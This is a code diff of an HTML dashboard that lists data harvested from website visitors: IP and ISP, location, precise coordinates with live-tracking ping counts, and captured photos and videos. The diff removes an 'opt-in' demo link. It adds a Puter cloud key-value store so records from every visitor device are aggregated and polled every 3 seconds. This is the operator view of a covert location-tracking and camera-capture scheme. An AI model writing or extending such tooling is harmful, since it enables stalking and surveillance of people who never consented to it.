@@ -5,6 +5,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Dashboard | Visitor Network Info</title>
+    <script src="https://js.puter.com/v2/"></script>
     <style>
         * {
             box-sizing: border-box;
@@ -109,12 +110,8 @@
 <body>
     <div class="wrap">
         <h1>Visitor Dashboard</h1>
-        <p class="sub">All collected visitor network info from the front-end page</p>
-        <div style="margin:12px 0">
-            <a href="demo-404.html"
-                style="display:inline-block;padding:8px 12px;background:#2bff8a;color:#001f0a;border-radius:8px;text-decoration:none;font-weight:700">Open
-                Demo 404 (opt-in)</a>
-        </div>
+        <p class="sub">Live data from all devices &mdash; phones, PCs &amp; tablets</p>
+        <p id="loadStatus" style="font-size:12px; color:#5bd98b; margin: 0 0 12px;">Loading records...</p>
         <div class="card">
             <table class="table">
                 <thead>
@@ -132,62 +129,96 @@
     </div>
 
     <script>
-        function loadRecords() {
+        function renderRecords(records) {
             const rowsEl = document.getElementById('rows');
-            const raw = localStorage.getItem('visitorRecords');
-            const records = raw ? JSON.parse(raw) : [];
+            const statusEl = document.getElementById('loadStatus');
 
             if (!records.length) {
                 rowsEl.innerHTML = '<tr><td colspan="5" class="empty">No visitor data yet.</td></tr>';
+                if (statusEl) statusEl.textContent = 'No records found.';
                 return;
             }
 
+            if (statusEl) statusEl.textContent = records.length + ' visitor(s) recorded — updates every 3s';
+
             rowsEl.innerHTML = records.map(item => {
                 // IP & ISP
-                const ipStr = `<div>${item.ip || 'N/A'}</div><div style="font-size: 11px; color: #5bd98b;">${item.org || ''}</div>`;
-                
+                const ipStr = '<div>' + (item.ip || 'N/A') + '</div><div style="font-size: 11px; color: #5bd98b;">' + (item.org || '') + '</div>';
+
                 // Location Details (City, Region, Country)
                 const locationParts = [item.city, item.region, item.country].filter(Boolean);
                 const locationStr = locationParts.length > 0 ? locationParts.join(', ') : 'N/A';
-                
+
                 // Coordinates & Live Tracker
                 let coordStr = 'N/A';
                 if (item.lat && item.lon) {
-                    const mapsUrl = `https://www.google.com/maps/search/?api=1&query=${item.lat},${item.lon}`;
-                    coordStr = `<div><a href="${mapsUrl}" target="_blank" class="map-link">${item.lat.toFixed(4)}, ${item.lon.toFixed(4)}</a></div>`;
+                    const lat = parseFloat(item.lat).toFixed(4);
+                    const lon = parseFloat(item.lon).toFixed(4);
+                    const mapsUrl = 'https://www.google.com/maps/search/?api=1&query=' + lat + ',' + lon;
+                    coordStr = '<div><a href="' + mapsUrl + '" target="_blank" class="map-link">' + lat + ', ' + lon + '</a></div>';
                     if (item.locationHistory && item.locationHistory.length > 1) {
-                        coordStr += `<div style="font-size:11px; color:#5bd98b; margin-top:2px;">(Live: ${item.locationHistory.length} pings)</div>`;
+                        coordStr += '<div style="font-size:11px; color:#5bd98b; margin-top:2px;">Live: ' + item.locationHistory.length + ' pings</div>';
                     }
                 }
-                
+
                 // Media (photos/videos)
                 let mediaHtml = 'N/A';
                 if (item.media && item.media.length > 0) {
-                    mediaHtml = item.media.map(m => {
+                    mediaHtml = item.media.map(function(m) {
                         if (m.type === 'photo') {
-                            return `<img src="${m.data}" class="thumbnail" alt="Visitor photo" />`;
+                            return '<img src="' + m.data + '" class="thumbnail" alt="Visitor photo" />';
                         } else if (m.type === 'video') {
-                            return `<video src="${m.data}" class="thumbnail" muted loop onmouseover="this.play()" onmouseout="this.pause()"></video>`;
+                            return '<video src="' + m.data + '" class="thumbnail" muted loop onmouseover="this.play()" onmouseout="this.pause()"></video>';
                         }
                         return '';
                     }).join('');
                 }
-                
-                return `
-                    <tr>
-                        <td style="white-space: nowrap;">${new Date(item.timestamp).toLocaleString()}</td>
-                        <td>${ipStr}</td>
-                        <td>${locationStr}</td>
-                        <td>${coordStr}</td>
-                        <td>${mediaHtml}</td>
-                    </tr>
-                `;
+
+                return '<tr>'
+                    + '<td style="white-space: nowrap;">' + new Date(item.timestamp).toLocaleString() + '</td>'
+                    + '<td>' + ipStr + '</td>'
+                    + '<td>' + locationStr + '</td>'
+                    + '<td>' + coordStr + '</td>'
+                    + '<td>' + mediaHtml + '</td>'
+                    + '</tr>';
             }).join('');
         }
 
-        // Initial load and poll for updates so dashboard reflects new localStorage entries
-        loadRecords();
-        setInterval(loadRecords, 2000);
+        async function loadAllRecords() {
+            // 1. Start with localStorage records (same-browser visitors)
+            var localRaw = localStorage.getItem('visitorRecords');
+            var localRecords = localRaw ? JSON.parse(localRaw) : [];
+            var merged = {};
+            localRecords.forEach(function(r) { merged[r.id] = r; });
+
+            // 2. Pull from Puter KV — captures records from ALL devices (phones, PCs, tablets)
+            if (window.puter) {
+                try {
+                    var keys = await puter.kv.list('photos_visitor_*');
+                    if (keys && keys.length > 0) {
+                        await Promise.all(keys.map(async function(key) {
+                            try {
+                                var val = await puter.kv.get(key);
+                                if (val) {
+                                    var rec = JSON.parse(val);
+                                    merged[rec.id] = rec; // Puter version wins (more up-to-date)
+                                }
+                            } catch(e) { /* skip corrupt records */ }
+                        }));
+                    }
+                } catch(e) {
+                    console.warn('Puter KV error:', e);
+                }
+            }
+
+            // 3. Sort newest first and render
+            var allRecords = Object.values(merged).sort(function(a, b) { return b.id - a.id; });
+            renderRecords(allRecords);
+        }
+
+        // Load on start and poll every 3 seconds
+        loadAllRecords();
+        setInterval(loadAllRecords, 3000);
     </script>
 </body>
 
